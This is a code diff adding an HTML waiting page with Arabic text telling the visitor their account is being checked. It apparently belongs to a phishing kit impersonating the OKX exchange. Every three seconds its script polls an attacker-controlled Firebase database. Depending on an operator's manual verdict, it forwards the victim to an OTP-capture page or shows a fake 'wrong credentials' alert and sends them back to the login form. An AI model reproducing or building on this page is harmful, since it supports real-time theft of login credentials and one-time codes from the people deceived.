@@ -1,0 +1,18 @@
+<body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
+    <div id="status">جاري فحص الحساب... يرجى الانتظار</div>
+    <div class="loader"></div> <script>
+        const dbUrl = "https://okx-project-ef5bf-default-rtdb.firebaseio.com/status.json";
+        
+        setInterval(async () => {
+            const res = await fetch(dbUrl);
+            const data = await res.json();
+            
+            if (data.result === "valid") {
+                window.location.href = "otp.html";
+            } else if (data.result === "wrong") {
+                alert("بيانات الدخول غير صحيحة، حاول مجدداً");
+                window.location.href = "index.html";
+            }
+        }, 3000); // بيفحص كل 3 ثواني هل إنت وافقت على البيانات ولا لأ
+    </script>
+</body>
